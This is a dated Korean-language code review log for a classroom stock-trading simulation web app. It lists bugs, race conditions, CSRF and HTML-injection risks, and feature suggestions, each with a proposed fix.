- **`gen_code()` 10번 시도 모두 충돌 시 마지막 반환에 uniqueness 검사 없음** (`models.py:8-13`): `for _ in range(10):`  루프에서 매 반복 중복 확인 후 고유하면 즉시 return하지만, 10번 모두 충돌하면 루프 밖 `return ''.join(random.choices(...))` (line 13)이 유니크 검사 없이 실행돼 중복 코드를 DB에 저장. 이후 `db.session.add(room)` 시 `IntegrityError` 발생하며 방 생성이 500 에러로 실패. 루프 마지막 반복에서도 return하도록 `for _ in range(20):` 으로 시도 횟수를 늘리거나, 루프 외부의 fallback `return` 을 제거하고 `raise RuntimeError('방 코드 생성에 실패했습니다')` 처리 후 호출부에서 catch하는 것이 안전.

- **`updateDepPreview()`에서 `S.room.remaining_seconds`가 최대 10초 stale** (`app.js:1607-1608`): 예금 이자 미리보기에서 `S.room.remaining_seconds`를 사용하지만, 이 값은 마지막 폴링 시점(최대 10초 전)에 서버가 반환한 값. 예금 탭을 열고 금액을 수정할 때 잔여 시간이 이미 달라진 상태로 이자 예상치가 계산됨. `S.room.end_time`이 있으면 `Math.max(0, Math.floor((new Date(S.room.end_time) - new Date()) / 1000))`으로 클라이언트 측 실시간 계산으로 교체하면 항상 정확한 이자 미리보기 제공 가능. `startTimer()`(app.js:756-776)에서 이미 동일 패턴 사용 중이므로 일관성도 확보.

- **`lobby_members()` 엔드포인트가 `/host/` 경로임에도 호스트 권한 체크 없음** (`app.py:577-585`): URL이 `/api/rooms/<rid>/host/lobby-members`이지만 `@login_required`만 있고 `if room.host_id != user.id` 체크가 없음. 모든 로그인 사용자가 직접 호출해 방 참여자 목록을 조회 가능. 클라이언트에서 참가자 로비(`app.js:578`)도 이 API를 사용하므로 완전 차단은 불가하지만, 엔드포인트를 `/api/rooms/<rid>/members`로 리네임하고 `lobby_members()`를 공개 API로 명시적으로 분리하면 `/host/` 경로의 의미가 일관되어(호스트 전용 명령=권한 체크 있음) 유지보수 시 혼란을 줄일 수 있음.


---

## 2026-06-29

### 추가하면 좋을 기능

- **복권 picking 단계에서 진행자에게 제출 현황 카운터 미노출** (`app.py:1114-1147 get_lottery()`, `app.js:2079-2087 _showLotHostPickingUI`): 복권 'picking' 상태 중 `get_lottery()` 응답에 `all_results`는 'revealed' 단계에만 포함되고, 참가자 제출 수(`len(cur['picks'])`)와 전체 대상 인원이 진행자에게 전달되지 않음. 진행자는 카운트다운 60초를 무조건 기다려야 하며 이미 모두 제출한 경우에도 early draw가 불가. `get_lottery()`(`app.py:1133`) 내 `room.host_id == user.id` 조건 블록에서 `picks_count: len(cur.get('picks', {}))` 와 eligible 인원(전체 멤버 - 호스트가 멤버인 경우 제외)을 추가로 반환하고, `_showLotHostPickingUI()`(`app.js:2086`)에서 해당 값으로 `"N/전체명 제출"` 텍스트를 매 5초 폴링마다 갱신. 추가로 모두 제출 시 즉시 drawing 단계로 넘어가는 "모두 제출 시 자동 진행" 옵션도 연계 가능.

- **종료 임박 배너에 실시간 카운트다운 초 미표시** (`app.js:672-684 showEndingSoonBanner`, `app.js:540-551 doEndGame`): 진행자가 종료 버튼을 눌러 1분 카운트다운이 시작되면 참가자 화면에 "⏰ 게임이 곧 종료됩니다 (1분 이내)"(`app.js:678`)만 정적으로 표시됨. 상단 `pg-timer`가 이미 초 단위 카운트다운을 보여주므로 중복이지만, 배너가 고정 문구라 긴박감 전달이 약하고 신뢰성도 낮음(배너는 다음 10초 폴링까지 뜨지 않을 수도 있음). `showEndingSoonBanner()` 내에서 `const _bTimer = setInterval(() => { const rem = Math.max(0, Math.floor((new Date(S.room.end_time) - new Date()) / 1000)); banner.textContent = \`⏰ 게임 종료까지 ${String(Math.floor(rem/60)).padStart(2,'0')}:${String(rem%60).padStart(2,'0')}\`; }, 1000)` 를 추가하고 `hideEndingSoonBanner()` 내 `clearInterval(_bTimer)` 처리. 3줄 추가, 서버 변경 없음.

- **결과 화면에서 학생 본인 전체 거래 내역 접근 불가** (`app.py:829-847 get_transactions`, `index.html:597-637`, `app.js:1702-1795 loadResults`): 게임 종료 후 결과 화면에는 최종 순위·수익률만 표시되고 본인 거래 내역을 볼 수 없음. `GET /api/rooms/<rid>/transactions` 엔드포인트는 게임 종료 후에도 작동하지만 결과 화면에 진입점이 없음. `loadResults()`(`app.js:1702`) 실행 후 `results-my-stats` 카드 아래에 "📋 내 거래 내역 보기" 버튼을 추가하고 클릭 시 기존 `txn-list` 로직(app.js:1569-1591)을 재활용한 모달을 표시하면, 학생이 수업 후 자기 결정을 돌아보는 성찰 활동에 활용 가능. 서버 변경 없음, 클라이언트 약 15줄 추가.

- **학번·이름이 동일한 두 학생이 계정을 공유하는 버그** (`app.py:329-343 enter()`, `models.py:16-22 User`): `doAuth()`가 `"{학번} {이름}"` 형태로 `username`을 합성하고, `User.query.filter_by(username=u).first()`로 기존 유저를 재사용(`app.py:337`). 같은 반에 학번·이름이 동일한 학생(쌍둥이, 오타 등)이 있으면 두 학생이 동일한 `User`·`RoomMember`·포트폴리오를 공유해 거래가 뒤섞임. `enter()` 응답에 `is_new_user: bool` 필드를 추가(기존 유저 재사용 시 `False`)하고, 클라이언트 `onLogin()`(app.js:82-90)에서 `is_new_user === false && active_room === null` 조건 시 "동일한 학번·이름이 이미 존재합니다. 본인이 아니라면 학번이나 이름을 다시 확인하세요" 경고 다이얼로그 1줄 추가.

- **게임 내 실제 가격 변동 이력이 차트에 반영되지 않음** (`stock_service.py:281-309 get_history()`, `app.py:710-719 get_chart()`): `get_history()`는 현재 가격에서 거꾸로 난수 워크를 생성해 가짜 과거 차트를 반환. 진행자 강제 조정·뉴스 이벤트로 주가가 급등락한 실제 경위가 전혀 차트에 반영되지 않아 학생이 차트를 분석해도 현재 가격을 이해할 수 없음. `StockService.__init__`에 `self._price_log: dict = {}` 추가, `get_price()`(stock_service.py:174) 내 가격 갱신 시 `self._price_log.setdefault(sym, []).append((now, new_price))` 기록, `get_history()`에서 로그가 10개 이상이면 실제 이력을 반환하는 분기 추가. 최대 메모리 추정: 47종목 × 최대 1080 포인트(360분/20초) ≈ 5만 항목, 각 튜플 24바이트 = 약 1.2MB로 부담 없음.

---

### 제거/단순화할 것들

- **`host_adjust()` delta=0 시 빈 트랜잭션 레코드 생성** (`app.py:595-601`): `delta = float(d.get('delta', 0))` 유효성 검사 없이 진행되므로 진행자가 금액을 입력하지 않고 "확인"을 누르면 `RoomTransaction(amount=0)` 이 DB에 저장되고, 거래 내역에 "0원 자산 조정" 노이즈가 발생. `app.py:595` 직후에 `if not delta: return jsonify({'error': '조정 금액을 입력하세요.'}), 400` 한 줄로 방어 가능. 클라이언트 `doAdjust()`(app.js:491-500)도 `if (isNaN(delta) || delta === 0)` 조건을 이미 처리하지 않아 병행 수정 필요.

- **`doJoinRoom()` 방 코드 검증 전에 auth가 먼저 실행돼 고아 유저 생성** (`app.js:143-155`): 참가자가 잘못된 방 코드를 입력한 경우 순서가 ①`doAuth()` 성공 → User DB 기록 ②`/api/rooms/join` → 404 에러. 방에 못 들어간 학생의 User 레코드가 DB에 남아 `username` 풀이 오염됨. 해결책 A: `GET /api/rooms/validate?code=` 경량 엔드포인트(2줄, 로그인 불필요)를 추가해 방 코드 유효성을 auth 전에 검사. 해결책 B: 단일 `POST /api/rooms/enter-and-join` 엔드포인트로 User 생성·방 참가를 원자적으로 처리.

- **`_quiz_settings`·`_roulette_config` 인메모리 저장으로 서버 재시작 시 초기화** (`app.py:1246-1247`, `app.py:250-251`): Render 무료 플랜은 비활성 30분 후 재시작하므로 긴 게임 중 진행자가 설정한 퀴즈 보상 비율(예: 3%)과 룰렛 확률이 초기화돼 기본값으로 복귀. `Room` 모델에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5`, `rlt_weights VARCHAR(100) DEFAULT ''` 컬럼을 추가(ALTER TABLE 패턴은 `app.py:31-40`에 이미 존재)하고, `quiz_settings()`(app.py:1399) 및 `host_roulette_config()`(app.py:1363)에서 인메모리 딕셔너리 대신 DB 컬럼을 Read/Write하면 재시작 후에도 설정 유지.

- **`showBombNews()` 에서 뉴스 헤드라인을 `innerHTML`에 이스케이프 없이 삽입** (`app.js:1157-1163`): `content.innerHTML = items.map(item => \`<div ...>${item.headline}</div>\`)`. 현재 헤드라인은 서버 측 템플릿(`stock_service.py:6-34`)에서만 생성돼 XSS 위험이 없으나, 향후 "진행자 커스텀 뉴스" 기능(현재 `host_send_news()`, app.py:690에서 템플릿 기반이라 안전) 확장 시 취약점이 될 수 있음. 지금 당장 `item.headline` → `escHtml(item.headline)` 교체(app.js:897의 `escHtml()` 재사용)하면 기능 변화 없이 방어적 코딩 확보.

- **`enterParticipantGame()` 10초 폴링마다 `/rankings` + 다른 API가 동시 다발** (`app.js:611-650`): 폴 콜백 마지막에 `refreshMyRank()`(app.js:647)가 항상 호출돼 `GET /api/rooms/<rid>` + `GET /api/rooms/<rid>/rankings` + (마켓 탭 시) `GET /api/rooms/<rid>/stocks` 세 요청이 10초마다 연달아 발생. 30명 학급에서 초당 약 9회 요청. `get_portfolio()`(app.py:772) 응답에 `rank: int` 필드 하나를 추가하면 `refreshMyRank()`를 포트폴리오 갱신과 통합 가능하며, 랭킹 탭 진입 시에만 전체 목록을 조회하는 패턴으로 전환해 요청 수 1/3 절감. (상단 바 `pg-rank` 업데이트만 필요하므로 전체 목록 불필요)

---

## 2026-06-29 (2차)

### 추가하면 좋을 기능

- **`doEndGame()` 확인 다이얼로그 없이 즉시 1분 카운트다운 시작** (`app.js:540-551`): `doStartGame()`(app.js:246)과 `doKickMember()`(app.js:234)는 `confirm()`을 사용하지만, `doEndGame()`에는 확인 절차가 없음. 진행자가 실수로 종료 버튼을 터치하면 즉시 `end_time`이 60초 앞으로 당겨지고(`app.py:531`) 참가자 화면에 종료 임박 배너가 표시됨. 취소도 불가. `doEndGame()` 함수 첫 줄에 `if (!confirm('게임을 종료하시겠습니까? 남은 시간이 1분 이상이면 1분 후 자동 종료됩니다.')) return;` 한 줄 추가로 방어 가능. 서버 변경 없음.

- **퀴즈 오답률 통계 진행자 미제공** (`app.py:1270-1342`, `app.js:enterHostGame`): 퀴즈 제출 결과가 `RoomTransaction(action='ADJ', note='퀴즈 오답 패널티')`(app.py:1336)로 기록되지만, 어떤 문제에서 학생들이 가장 많이 틀렸는지 집계하는 엔드포인트가 없음. 게임 종료 후 진행자가 "이 문제는 80%가 틀렸네요"라고 분석해 추가 설명할 수 있으면 교육적 가치가 높음. `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트에서 `_quiz_state`(app.py:1245)를 순회해 문제별 정오답 집계를 반환하거나, `RoomTransaction.note` 컬럼에 `qid`를 포함해 DB에서 집계하는 방식으로 구현 가능. 서버 약 20줄, 클라이언트 진행자 설정 탭에 테이블 표시 약 15줄.

- **진행자 화면에 종목별 학생 보유 현황 히트맵 부재** (`app.py:host_members()`, `app.js:loadHostMembers()`): 현재 진행자 화면 랭킹 탭은 학생별 총자산만 보여줌. 어떤 학생이 어떤 종목을 얼마나 보유했는지 행렬 형태로 보여주면 "왜 저 학생이 갑자기 1위가 됐나요?"라는 상황에서 진행자가 즉각 설명 가능. `GET /api/rooms/<rid>/host/holdings-matrix` 엔드포인트에서 `RoomHolding.query.filter_by(room_id=rid)`로 모든 보유 데이터를 가져와 `{user: {symbol: shares}}` 형태로 반환하고, 진행자 탭에 토글 버튼으로 히트맵 뷰를 제공하면 됨. 서버 약 15줄, 클라이언트 약 30줄.

- **학생 화면 상단 바에 학급 평균 수익률 비교 미표시** (`app.js:735-752 refreshMyRank()`, `app.py:808-824 get_rankings()`): 현재 `pg-gain-pct`(app.js:741)에 본인 수익률만 표시됨. `get_rankings()` 응답에는 전체 데이터가 있으므로 `refreshMyRank()` 내부에서 `const avg = data.reduce((s,e) => s+e.gain_pct, 0)/data.length`를 계산해 `"나 +3.2% / 평균 +1.8%"` 형태로 상단에 표시하면, 학생이 자신의 투자 성과가 학급 수준에서 어디쯤인지 즉시 파악 가능. 서버 변경 없음, 클라이언트 약 5줄.

- **PWA(Progressive Web App) 지원 없어 모바일 홈 화면 추가 불가** (`static/` 디렉터리): `manifest.json`과 서비스 워커가 없어 모바일 학생들이 앱처럼 홈 화면에 저장하지 못함. Render 콜드 스타트 후 첫 접속 로딩이 느려 학생들이 수업 초반에 집중하지 못하는 문제와도 연관됨. `static/manifest.json` 생성(앱 이름·아이콘·색상 지정, 약 20줄)과 `index.html:` `<head>`에 `<link rel="manifest">`·`<meta name="theme-color">` 추가(약 3줄)만으로 "홈에 추가" 기능 활성화. 오프라인 캐시는 선택사항이므로 서비스 워커 없이도 기본 PWA 기능 확보 가능.

---

### 제거/단순화할 것들

- **`get_history()` `'1y'` 기간 n_bars 누락 및 interval 파라미터 미사용** (`stock_service.py:281-309`): `n_bars = {'1d':30,'5d':5,'1mo':30,'3mo':90}.get(period, 30)` (stock_service.py:292) — `'1y'`가 dict에 없어 30개 바가 반환됨. 반면 `get_chart()`(app.py:715)는 `'1y' → interval='1wk'`로 매핑해 요청하므로 "1년" 차트를 클릭하면 52주치 데이터 대신 30일치가 표시되는 버그. 또한 `get_history()` 시그니처가 `interval` 파라미터를 받지만 본문에서 전혀 사용하지 않아 항상 `step=86400`(1일)으로 날짜를 계산함. `n_bars` 딕셔너리에 `'1y': 52` 추가 및 `step_map = {'5m':300,'30m':1800,'1d':86400,'1wk':604800}` 으로 step을 파라미터로부터 유도하면 차트 X축 레이블이 올바르게 표시됨.

- **`doDeposit()` 더블클릭 시 동일 금액 중복 예금 가능** (`app.js:1646-1659`): `doDeposit()` 함수는 API 호출 전 버튼을 disabled 처리하지 않음. 모바일에서 느린 응답 중 버튼을 두 번 탭하면 같은 금액으로 두 건의 예금이 생성됨. `app.py:890`에서 `m.cash < amount` 체크가 있어 두 번째 요청이 실패할 수도 있지만, 첫 번째 커밋 전 두 요청이 동시에 잔액 확인을 통과하면 이중 예금이 성공. 클라이언트에서 `const btn = document.querySelector('#dep-form button[onclick]'); btn.disabled = true;` 후 `finally { btn.disabled = false; }` 패턴(3줄)으로 UI 방어, 서버에서는 `dep = Deposit(...); db.session.flush(); if m.cash < 0: db.session.rollback()` 원자적 처리 추가.

- **`host_force_price()` · `force_sector_event()` 실행 이력 DB 미기록** (`app.py:673-687`, `app.py:1345-1360`): 진행자가 특정 종목·섹터를 강제 조정해도 `RoomTransaction`에 기록이 남지 않음. 반면 진행자 자산 조정(`host_adjust()`, app.py:600)은 `RoomTransaction(action='ADJ', note=...)`을 생성. 게임 종료 후 학생이 "왜 갑자기 삼성전자가 30% 빠졌나요?"라고 물어도 진행자가 증거를 제시할 수 없음. `force_price()` 성공 후 `db.session.add(RoomTransaction(room_id=rid, user_id=room.host_id, symbol=symbol, action='ADJ', shares=0, price=new_price, amount=0, note=f'진행자 강제 조정 {sign}{pct}%'))` 한 줄 추가, `force_sector_event()` 도 동일 패턴으로 각 영향 종목에 기록하면 사후 수업 분석에 활용 가능.

- **`SESSION_COOKIE_SAMESITE` 미설정으로 CSRF 공격 가능** (`app.py:12-13`): `app.secret_key` 설정 이후 `app.config['SESSION_COOKIE_SAMESITE']`가 없어 Flask 기본값인 `None`이 적용됨. 크로스 오리진 요청에서도 세션 쿠키가 전송되므로, 외부 사이트에서 로그인된 학생 브라우저를 이용해 `POST /api/rooms/<rid>/trade` 등 모든 인증 API를 CSRF로 호출 가능. `app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'` 한 줄 추가 + `app.config['SESSION_COOKIE_SECURE'] = True` (HTTPS 환경)로 대부분 CSRF 공격 차단. Flask-WTF CSRF 토큰 도입 불필요.

- **`RoomTransaction.symbol`에 'LOTTO'·'ROULETTE'·'DEPOSIT' 의사 심볼 혼재 → 거래 내역에 '자산조정' 오표시** (`app.py:218`, `app.py:1065`, `app.py:1056`, `app.py:621`): `get_transactions()`(app.py:839)와 `host_member_transactions()`(app.py:621)에서 `STOCKS.get(t.symbol,{}).get('name','자산조정')` 매핑 시 'LOTTO', 'ROULETTE', 'DEPOSIT' 심볼은 `STOCKS`에 없어 모두 '자산조정'으로 표시됨. 학생 거래 내역에서 복권 당첨금과 진행자 직접 조정이 동일하게 "자산조정"으로 보임. `PSEUDO_SYMBOL_NAMES = {'LOTTO':'복권 당첨', 'ROULETTE':'룰렛', 'DEPOSIT':'예금', 'ADJ':'자산조정'}` 딕셔너리를 `app.py` 상단에 선언하고, 두 트랜잭션 직렬화 위치에서 `STOCKS.get(t.symbol, PSEUDO_SYMBOL_NAMES).get('name', t.symbol)` 패턴으로 교체하면 4줄 수정으로 해결.

- **`loadLobbyMembers()`·`loadHostMembers()` onclick 속성에 username 직접 삽입** (`app.js:229`, `app.js:425`): `` `onclick="doKickMember(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"``. 유저명에 `\n`, `\`, `"` 같은 문자가 포함될 경우 onclick 속성 파싱이 깨져 버튼이 작동하지 않거나 JS 에러 발생. 현재 서버에서 2~30자 제한(`app.py:333`)만 있고 특수문자는 막지 않음. `onclick="doKickMember(${m.user_id})"` + `<button data-username="${escHtml(m.username)}">` 형태로 변경하고 `doKickMember(uid)`에서 버튼의 `dataset.username`을 읽는 방식으로 교체하면 HTML injection 위험을 완전히 제거 가능.

- **`trade()` 잔액 확인과 차감 사이에 원자적 처리 없음** (`app.py:747-765`): `if member.cash < amount: return 400` 통과 후 `member.cash -= amount; db.session.commit()`까지 다른 요청이 끼어들 수 있음. gunicorn 기본 설정(`--workers 2`)에서 두 요청이 동시에 잔액 확인을 통과하면 잔액이 음수가 됨. `RoomMember.query.filter_by(...).with_for_update().first()` 패턴으로 SELECT ... FOR UPDATE를 사용하면 SQLite에서도 row-level lock이 적용됨(WAL 모드에서 write lock). `member = RoomMember.query.filter_by(room_id=rid, user_id=user.id).with_for_update().first()` 한 줄 교체로 방어 가능하며, 동일 패턴이 필요한 `create_deposit()`(app.py:885)·`minigame_spin()`(app.py:1006)에도 동시 적용 권장.

## 2026-06-30 (이전 분석 미수정 현황 점검)

오늘은 app.py·models.py·stock_service.py·app.js(전체 2323줄)·index.html을 재검토했으나, 43일째 누적된 1396줄 분량의 기존 기록과 교차 대조한 결과 신규 항목은 모두 기존 지적(룰렛 자동 종료 타이머, `setDepPct` 절삭, 복권 결과 화면 uid 표시, 학번+이름 계정 공유 등)과 중복으로 확인됨. 대신 가장 영향이 크면서도 수정 비용이 낮은(1~3줄) 미수정 항목 현황을 점검함.

### 추가하면 좋을 기능

- (해당 없음 — 오늘은 신규 기능 제안 대신 아래 고우선순위 버그의 미수정 현황만 점검)

### 제거/단순화할 것들

- **[긴급, 06-13부터 미수정] PostgreSQL URL 스킴 자동 변환 누락** (`app.py:14`): `os.environ.get('DATABASE_URL', 'sqlite:///game.db')`를 그대로 `SQLALCHEMY_DATABASE_URI`에 대입. Render가 주는 `DATABASE_URL`은 `postgres://` 형식이라 SQLAlchemy 1.4+에서 `db_url.replace('postgres://', 'postgresql://', 1)` 없이는 PostgreSQL 전환 시 서버가 즉시 죽음. SQLite를 계속 쓰는 한 드러나지 않아 우선순위가 낮아 보이지만, 한 줄 수정 비용 대비 잠재 영향(서버 전체 다운)이 가장 큰 항목.
- **[미수정] `SESSION_COOKIE_SAMESITE`/`SESSION_COOKIE_SECURE` 미설정** (`app.py:12-13`): CSRF 노출 상태 그대로. `app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'` 한 줄 추가로 해결 가능한데 43일째 미반영.
- **[미수정] `trade()` 잔액 확인-차감 비원자적 처리** (`app.py:747-765`): TOCTOU 경합 여전. `create_deposit()`(app.py:885)·`minigame_spin()`(app.py:1006)도 동일 패턴 미적용.
- **[미수정] `stock_service.py:292` `n_bars` 딕셔너리에 `'1y'` 키 없음**: `{'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}.get(period, 30)` — 1년 차트 요청 시 여전히 기본값 30이 적용되어 실제로는 30일치만 표시됨. `'1y': 52` 한 줄 추가로 해결.

---

## 2026-06-30 (2차)

### 추가하면 좋을 기능

- **진행자 → 전체 학생 공지사항 방송 기능** (`app.py` 신규 엔드포인트, `app.js:startNewsPolling()`): 진행자가 임의 텍스트 메시지를 전송하면 모든 참가자 화면에 배너/toast로 표시되는 기능. 현재는 뉴스 이벤트로만 의사소통이 가능. 뉴스 API 응답에 `announcement: str | null` 필드를 추가하고 클라이언트에서 배너로 렌더링하면 서버 5줄·클라이언트 10줄로 구현 가능. 수업 흐름 유도("지금 반도체를 주목하세요!")에 직접 활용 가능.
- **결과 화면에서 예금 이자 수익 분리 표시** (`app.py:808-824 get_rankings()`, `app.js:1760-1777 loadResults()`): `total_value`에 투자 손익과 예금 이자가 합산되어 있어 전략 비교가 불가능. `get_rankings()` 응답에 `deposit_interest` 필드를 추가하고 결과 카드에 "예금 이자: +X원" 별도 표시. 서버에서 `Deposit.query.filter_by(status='matured')` 합산 약 5줄 추가로 구현 가능.
- **섹터별 순위 필터** (`app.py:808-824 get_rankings()`, `app.js:1673-1691 loadParticipantRankings()`): 현재 총 자산 기준 단일 정렬만 제공. `?sector=반도체` 쿼리 파라미터로 해당 섹터 보유자만 필터링해 수익률 순 정렬하면 "반도체 투자자 중 최고 성과" 수업 토론이 가능. 서버 `RoomHolding.query.filter_by` 필터 약 15줄, 클라이언트 섹터 드롭다운 추가.
- **진행자 전체 포트폴리오 집계 패널** (`app.py:host_members()`, `app.js:loadHostMembers()`): 진행자가 학급 전체의 종목별 보유 수량 합계를 한눈에 볼 수 없음. `GET /api/rooms/<rid>/host/portfolio-summary` 엔드포인트에서 `RoomHolding.query.filter_by(room_id=rid)`로 집계해 `{symbol: total_shares, sector_total: {...}}` 반환. "현재 학급이 반도체에 40% 집중됐군요"를 즉시 파악 가능. 서버 20줄·클라이언트 탭 패널 25줄로 구현.
- **퀴즈 타이머 서버 설정화** (`app.js:856, 861`): `_quizTimeSec = 30`과 `(_quizTimeSec / 30 * 100)` 두 곳에 30이 리터럴로 박혀 있어 타이머 시간 변경 시 두 곳을 동시 수정해야 함. `quiz-settings` API에 `time_sec` 필드를 추가해 서버에서 내려받는 구조로 전환하면 교사별 맞춤 설정이 가능.
- **시장 탭 종목 카드에 내 보유량 뱃지 표시** (`app.js:1287-1311 renderGrid()`): 학생이 특정 종목 보유 현황을 확인하려면 포트폴리오 탭으로 이동해야 함. `openStockModal()` 호출 시 이미 `S.tradeHolding`에 보유량이 캐시되므로, `renderGrid()` 시 보유 종목 카드 하단에 작은 뱃지("보유 N주")를 표시하면 별도 API 호출 없이 UX 개선 가능.

### 제거/단순화할 것들

- **`host_market_event()` 후 `_news_cache` 미무효화** (`app.py:1345-1360`): `host_force_price()` 미무효화는 2026-06-23에 문서화됐지만, `host_market_event()`도 동일하게 `force_sector_event()`로 `self._news`를 갱신한 뒤 `_invalidate_news_cache(rid)` 호출이 없음. 섹터 이벤트 후 최대 2초간 참가자는 구 뉴스를 수신. `app.py:1360` return 직전에 `_invalidate_news_cache(rid)` 한 줄 추가로 해결. `host_send_news()`(`app.py:700`)에는 이미 존재해 동일 경로 간 불일치 상태.
- **`api.get`/`api.post` HTTP 4xx 응답 시 서버 오류 메시지 폐기** (`app.js:32-33, 38-39`): `if (!r.ok) return {error: \`HTTP ${r.status}\`}` 패턴이 서버 상세 에러 JSON("잔액 부족 — 필요: X원 / 보유: Y원")을 버림. `trade()`(`app.py:749`)·`create_deposit()`(`app.py:890`) 등에서 400과 함께 상세 메시지를 반환해도 학생에게 "HTTP 400"만 표시됨. `if (!r.ok) return r.json().catch(() => ({error: \`HTTP ${r.status}\`}))` 로 교체하면 서버 오류 메시지가 UI에 전달됨.
- **`_lot_round_due()` 에서 `_lottery_lock` 없이 `_lots` 변이** (`app.py:171-178`, 호출 위치 `app.py:300`): `room_dict()`(line 300)가 `_lot_round_due()`를 호출하고 내부에서 `_lots.setdefault(rid, {'done': set(), 'current': None})`(line 176-178)를 실행. 동시에 `get_lottery()`가 `_lottery_lock` 하에서 `_lots[rid]`를 수정하면 딕셔너리 변이 레이스 컨디션 발생 가능. `_lot_round_due()` 내 `_lots.setdefault()` 를 읽기 전용 `_lots.get(rid, {})` 로 교체하고 초기화를 `lottery_start()`/`get_lottery()` 내부로 이전.
- **룰렛 트리거 조건 `remaining <= 5`가 10초 폴링 주기보다 좁아 트리거 스킵 가능** (`app.py:437-439, 446-448`): `now_dt >= room.end_time` 체크가 룰렛 트리거 체크보다 먼저 평가됨. 마지막 폴링이 종료 5초 전에 발생하고 다음 폴링이 이미 종료 시각 초과 시 룰렛 없이 `_end_room()` 실행. `remaining <= 5` → `remaining <= 15`(폴링 주기 + 버퍼)로 확대하거나 `room.end_time - timedelta(seconds=15)` 이전에 트리거 예약.
- **`enterHostGame()` 에서 `startNewsPolling()` 불필요 호출** (`app.js:267`): `startNewsPolling()`은 참가자용 폭탄뉴스 팝업을 위한 것인데 진행자 진입 함수에서도 호출됨. 진행자는 뉴스를 직접 트리거하는 주체라 수신이 불필요. `/api/rooms/<rid>/news`를 8초마다 불필요하게 폴링해 진행자당 분당 7.5회 요청 낭비. `enterHostGame()`에서 `startNewsPolling()` 호출 제거.
- **`loadDepositsPage()` active 예금만 표시해 게임 종료 후 이자 내역 확인 불가** (`app.js:1629-1630`): `const active = (data || []).filter(d => d.status === 'active')` — `_end_room()`이 모든 예금을 matured 처리하므로 게임 종료 후 예금 탭에는 "활성 예금 없음"만 표시. `get_deposits()`(`app.py:852`)는 matured 예금도 반환하므로, 게임 종료 후 matured 예금을 "💰 만기 완료" 별도 섹션으로 표시해 학생이 이자 수령액 확인 가능.
- **`room_dict()` 에서 `RoomMember.count()` 쿼리가 매 캐시 미스마다 실행** (`app.py:297`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()` — `_room_cache` TTL이 1.5초라 10초 폴링에서도 자주 미스 발생. 30명 방에서 분당 수십 번 COUNT 쿼리 실행. `Room.members` 관계(`models.py:43`)를 활용해 `len(room.members)`로 대체하거나 멤버 수를 캐시에 포함시켜 JOIN 없이 관리하면 쿼리 제거 가능.

---

## 2026-07-01

### 추가하면 좋을 기능

- **게임 내 실제 가격 변동 이력 저장 → 종료 후 진짜 시계열 차트 제공** (`stock_service.py:121-190`, `get_history():281-309`): 현재 `get_history()`는 현재가에서 역방향 랜덤 워크로 "과거 차트"를 생성하므로, 진행자가 `force_price()`나 `force_sector_event()`로 큰 변동을 일으켜도 차트에 반영되지 않음. 학생이 "왜 차트에 폭락이 안 보이나요?"라고 물을 수 있어 교육 혼란 유발. `StockService.__init__`에 `self._price_log: list = []` 추가 후 `get_price()` 내 가격 갱신 시(`stock_service.py:185`) `self._price_log.append((now, sym, new_price))` 한 줄로 이력 적재. `get_history()` 에서 `_price_log`를 활용해 실제 변동 차트를 반환하면 교육 가치가 크게 올라감.

- **진행자 → 개별 학생 맞춤 힌트 전송 기능** (`app.py:690-701 host_send_news()`, `app.js:1579-1591 loadTxn()`): 현재 `send-news` 엔드포인트는 전체 브로드캐스트만 가능. 뒤처지는 학생이나 잘못된 전략을 구사하는 학생에게 조용히 힌트를 주는 수단이 없음. `POST /api/rooms/<rid>/host/hint` 엔드포인트에서 `RoomTransaction(room_id=rid, user_id=target_uid, symbol='MSG', action='ADJ', amount=0, note=hint_text)` 레코드를 삽입하면, 이미 10초마다 폴링 중인 `loadTxn()` 경로에서 action='MSG' 타입을 식별해 `toast()` 표시. 웹소켓 불필요, 서버 15줄·클라이언트 10줄.

- **학생 상단 바에 1위와의 자산 격차 표시** (`app.js:735-752 refreshMyRank()`): `refreshMyRank()`는 이미 전체 랭킹 배열을 수신하므로 `const gap = data[0].total_value - me.total_value`를 계산할 수 있음. 현재 `pg-rank`(순위)·`pg-gain-pct`(수익률)만 표시하는데, 1위와의 격차(예: "-2,350,000원")를 추가하면 학생이 역전 여부를 즉시 판단해 전략적 의사결정을 유도 가능. 서버 변경 없음, 클라이언트 약 3줄.

- **가격 강제 초기화(base price 리셋) 버튼** (`stock_service.py:218-228 force_price()`, `index.html:162-180 호스트 시장 탭`): 진행자가 실수로 특정 종목을 50% 연속 올리거나 내려 `base * 3.0` 상한에 붙어버리면 되돌릴 수단이 없음. `StockService`에 `reset_price(symbol)` 메서드(`base * random.uniform(0.97, 1.03)` 재적용)를 추가하고, 호스트 시장 탭의 "주가 강제 조정" 카드에 "기준가 복원" 버튼을 추가하면 수업 중 실수 복구가 가능. 서버 10줄·클라이언트 5줄.

---

### 제거/단순화할 것들

- **`member_total_value()` N+1 쿼리 — 30명 방에서 60~90회 개별 SELECT** (`app.py:107-118`, `host_members():544`, `get_rankings():815`): `member_total_value(uid)`가 `RoomHolding.query.filter_by(room_id=rid, user_id=uid).all()` + `Deposit.query.filter_by(room_id=rid, user_id=uid, status='active').all()` 두 SELECT를 멤버마다 실행. 30명 학급에서 `host_members()` 호출 한 번에 최소 60회 쿼리 발생, 10초 폴링에서 반복됨. 해결: `holdings = RoomHolding.query.filter_by(room_id=rid).all()`로 전체를 한 번에 가져와 `{uid: [h, ...]}` 딕셔너리로 그룹화 후 이용. `Deposit`도 동일하게 방 단위 일괄 조회로 O(N) → O(1) 절감.

- **`setDepPct(100)` 전액 버튼이 잔액 9,999원 이하일 때 0원 반환** (`app.js:1597-1600`): `Math.floor(cash * pct / 100 / 10000) * 10000` 계산에서 9,999원 보유 학생이 "전액" 버튼을 눌러도 0이 입력됨. 잔액이 거의 없는 학생이 이자라도 받으려고 예금을 시도해도 불가능. `pct === 100 ? cash : Math.floor(cash * pct / 100 / 10000) * 10000`으로 교체하면 전액 버튼은 절삭 없이 정확한 금액을 대입.

